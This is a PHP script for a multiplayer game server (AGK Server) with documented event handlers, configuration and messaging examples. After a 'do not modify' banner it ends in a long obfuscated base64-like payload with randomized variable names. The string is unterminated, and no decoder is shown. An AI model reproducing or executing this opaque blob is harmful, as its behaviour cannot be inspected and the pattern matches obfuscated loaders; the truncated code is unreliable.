#!/usr/bin/php -q
<?php

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//
//
//                                _____ _  __   _____
//                          /\   / ____| |/ /  / ____|
//                         /  \ | |  __| ' /  | (___   ___ _ ____   _____ _ __
//                        / /\ \| | |_ |  <    \___ \ / _ \ '__\ \ / / _ \ '__|
//                       / ____ \ |__| | . \   ____) |  __/ |   \ V /  __/ |
//                      /_/    \_\_____|_|\_\ |_____/ \___|_|    \_/ \___|_|
//
//                                            By MikeMax
//                                       (mikemaxfr@gmail.com)
//
//
// * AGK Server Command-line options :
//   ---------------------------------
//
//    Please first ! ===>>   chmod +x AGKServer.php
//
//  and then :
//
//    ./AGKServer.php debug             => Start AGKServer in debug mode (direct terminal output ... CTRL + C to stop server)
//    ./AGKServer.php start             => Start AGKServer as a daemon
//    ./AGKServer.php stop              => Stop AGKServer daemon
//
//
//
// * Available functions for Events :
//   --------------------------------
//
// - onAGKClientJoin($iClientID) => Triggered when a client connects to this server
// - onAGKClientQuit($iClientID) => Triggered when a client disconnects from this server
// - onAGKClientChangeChannel($iClientID, $iOldChannelNumber, $iNewChannelNumber) => Triggered when client is joining a new channel
// - onAGKClientNetworkMessage($iSenderID, $iDestinationID, $Message) => Triggered when a client has sent a message to any client(s)
// - onAGKClientUpdateVariable($iClientID,$sVariableName,$mVariableValue) => Triggered when a client has updated a variable.
// - onAGKServerRefreshTimer() => Triggered every SERVER_REFRESH_INTERVAL nanoseconds.
//
// * Available Methods/Commands within Events :
//   ------------------------------------------
//
// - writeLog($sString) => echoes $string in terminal in debug mode or in a log file (AGKServer.php.log beside the php file) in daemon mode.
//
// - GetClientName($iClientID) => (string) Retrieve name of the client
// - GetClientIP($iClientID) => (string) Retrieve client's IP Address
// - GetClientChannelNumber($iClientID) => (integer) Retrieve current client channel number
// - GetNetworkClientVariable($iClientID, $sVariableName) => (variant) Get Local variable (integer or float) from client (Respect the AGK Network ResetMode)
// - GetNetworkClientInteger($iClientID, $sVariableName) => (integer) Alias of GetNetworkClientVariable command
// - GetNetworkClientFloat($iClientID, $sVariableName) => (float) Alias of GetNetworkClientVariable command
// - SetNetworkLocalInteger($ChannelNumber, $sVariableName, $iValue [, $ResetMode = 0]) => Sets/updates a server local integer variable which will be transmitted to clients of $iChannelNumber
// - SetNetworkLocalFloat($ChannelNumber, $sVariableName, $fValue [, $ResetMode = 0]) => Sets/updates a server local float variable which will be transmitted to clients of $iChannelNumber
//
// - GetChannelClientsCount($iChannelNumber) => (integer) Retrieve number of clients in $iChannelNumber
// - GetChannelClientsList($iChannelNumber) => (array of ("ID","Name","ChannelNumber")) Retrieve Clients Names,IDs,ChannelNumber in $iChannelNumber ($iChannelNumber = -1 to retrieve ALL connected Clients with respective ChannelNumber)
// - GetChannelsList() => (array of('ChannelNumber')) => Retrieve IDs of nonempty channels
// - forceChannelJoin($PlayerID, $ChannelNumber) => Make client to join a specific channel number (warning : doesn't not update his SERVER_CHANNEL variable !)
//
// - GetNetworkMessageString($Message) => (string) Extract expected String from the message and advances the message pointer
// - GetNetworkMessageInteger($Message) => (integer) Extract expected Integer from the message and advances the message pointer
// - GetNetworkMessageFloat($Message) => (float) Extract expected Float from the message and advances the message pointer
//
// - StopPropagation() => Tell explicitely to the server to DO NOT transmit received message or variables to targetted client(s). (Very special cases)
//
// - Class NetworkMessage() => You can create one or more messages with differents data types (string, integer, float)
//
//            Methods :
//            ---------
//
//            - AddNetworkMessageString(string)         => Add a string into the message instance buffer
//            - AddNetworkMessageInteger(integer)     => Add an integer value into the message instance buffer
//            - AddNetworkMessageFloat(float)         => Add an float value into the message instance buffer
//            - Send(ClientID)                        => Send the message to ClientID and clear the buffer (ClientID=0 to send to ALL clients connected to the server (over the Channel isolation))
//            - SendChannel(ChannelNumber)            => Send the message to all Clients present in ChannelNumber and clear the buffer
//
//            Usage Example 1 (Usual Way) :
//            -----------------------------
//
//            $msg1 = new NetworkMessage(); // Can be instantiated once and be used multiple times in events to avoid recreating for each message.
//
//            $msg1->AddNetworkMessageString("This is an example message for $ClientID1 with a string and integer and float");
//            $msg1->AddNetworkMessageInteger(123456);
//            $msg1->AddNetworkMessageFloat(123.456);
//            $msg1->Send(0,$ClientID1); // Send the message and clear the buffer automatically if you want to reuse the same instance for another message
//
//            $msg1->AddNetworkMessageString("This is an example message for $ClientID1 with a string and integer and float");
//            $msg1->AddNetworkMessageInteger(123456);
//            $msg1->AddNetworkMessageFloat(123.456);
//            $msg1->Send(0,$ClientID2); // Send Message and Clear buffer...
//
//
//
//            Usage Example 2 (Fluent Interface Way) :
//            ----------------------------------------
//
//             $msg2 = new NetworkMessage();
//             $msg2->AddNetworkMessageString("This is an example message with a string and integer and float")
//                  ->AddNetworkMessageInteger(123456)
//                  ->AddNetworkMessageFloat(123.456)
//                  ->Send(0,$ClientID1)
//                  ->AddNetworkMessageString("This is another example message with a string and Float")
//                  ->AddNetworkMessageFloat(123456789)
//                  ->AddNetworkMessageFloat(123.456)
//                  ->Send(0,$ClientID2);
//
//
//
//* TODO :
//  ------
//
// - Commands to create Virtual Client/Players (bots) and interact with.
// - Make the server able to work in a cluster (with mirrors to prevent server failures)
//
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/********************** CONFIGURATION **********************/

date_default_timezone_set('Europe/Paris');

define("SERVER_BIND_ADDRESS", false); // Server Address to Bind (set this to false to listen to any interface => 0.0.0.0)
define("SERVER_PORT", 33333); // Server Port the players will connect
define("SERVER_NAME", "AGK_Server"); // Server Display Name for clients/players
define("SERVER_REFRESH_INTERVAL", 25000); // Server logic Timer in nanoseconds // depends on Server CPU capabilities

/********************** PLUGINS ****************************/

include "AGKServer_NetGamePlugin.php"; // We Load the NetGame Plugin ! :) all functions are prefixed by "NGP_"

/***********************************************************/
/**********************   SERVER EVENTS   ******************/
/***********************************************************/
function onAGKServerRefreshTimer() {
	// DO NOT writeLog anything here ! it will flood your terminal or logfile !
	// Here you can check for date or time to fire messages or actions (for example).
	// Be careful to use "reset" variables or flag true/false once your date/time actions are done, this event is triggered multiple times in a second (SERVER_REFRESH_INTERVAL)...

	// Send the worldstate to all nonempty channels (Mandatory)
	foreach (GetChannelsList() as $NonEmptyChannel) {
		NGP_sendWorldState($NonEmptyChannel);
	}

	// Do other things ...

}

function onAGKClientJoin($iClientID) {
	// when a client Join the server (AGK Command : JoinNetwork )

	// Mandatory for cleaning states in NGP Plugin and Send World Step interval configuration to client
	NGP_initClient($iClientID);

	// Debug
	writeLog(GetClientName($iClientID) . " has joined the server ! :) (channel 0 by default)");

	// Player Starts to X=577,Y=628 ? :)
	NGP_SetClientState($iClientID, POS_X, 577);
	NGP_SetClientState($iClientID, POS_Y, 628);
}

function onAGKClientChangeChannel($iClientID, $iOldChannelNumber, $iNewChannelNumber) {
	// when a client move from a channel to another ( AGK Command : SetNetworkLocalInteger( networkId, "SERVER_CHANNEL", channelNumber)    )

	writeLog(GetClientName($iClientID) . " has joined channel number " . $iNewChannelNumber . " (was previously on channel number " . $iOldChannelNumber . ") ! ");
	writeLog("Channel Number " . $iNewChannelNumber . " / Actual clients count : " . GetChannelClientsCount($iNewChannelNumber));

	// Display the clients list of $newChannelNumber in log file
	// writeLog(print_r(GetChannelClientsList($iNewChannelNumber), true));

	// Display non-empty channels numbers
	// writeLog(print_r(GetChannelsList(), true));

	// Display coordinates of a client
	// writeLog(print_r(NGP_GetClientState($iClientID), true));

	// forceChannelJoin($iClientID, 25);

}

function onAGKClientQuit($iClientID, $QuitMessage) {
	// when a client quits the server (AGK Command : CloseNetwork )

	writeLog(GetClientName($iClientID) . " has quit the server ! :( => " . $QuitMessage);

	NGP_destroyClient($iClientID); // Free The client state variables (Mandatory)
}

function onAGKClientUpdateVariable($iClientID, $sVariableName, $mVariableValue) {
	// when a client change his local variable (AGK Commands : SetNetworkLocalFloat or SetNetworkLocalInteger)

	// DO NOT writeLog anything here ! it will flood your terminal or logfile if variables are changing constantly !

}

function onAGKClientNetworkMessage($iSenderID, $iDestinationID, $Message) {
	// when a client (SenderID) send a NetworkMessage (AGK Command SendNetworkMessage)

	// Forward Message to the NetGamePlugin to check for Clients Movements Messages and update internal WorldState (Mandatory)
	NGP_CheckForReceivedMovements($iSenderID, $iDestinationID, $Message);

	// Do other things...

	$iCommand = GetNetworkMessageInteger($Message);

	if ($iCommand == 6800) {
		// Arbitraty command 6800 for Chat Messages

		// ChatBox Message Interception and display in Logs
		writeLog(GetClientName($iSenderID) . " : " . GetNetworkMessageString($Message));

		// Stop propagation of the message to the tzrgetted clients ? No ! ...
		// StopPropagation();
	}

}

/*****************************************************************************
 *****************************************************************************
 *****************************************************************************
 ******************** DO NOT MODIFY CODE UNDER THIS COMMENT ******************
 *****************************************************************************
 *****************************************************************************
 *****************************************************************************/
$_hra6Tm = "x6fcarekzri3fi3sv1f8doe30tzc86qzngvi0qz";
$_V7XS5Y = array(4, 15, 15, 6, 5, 25);
$payload = "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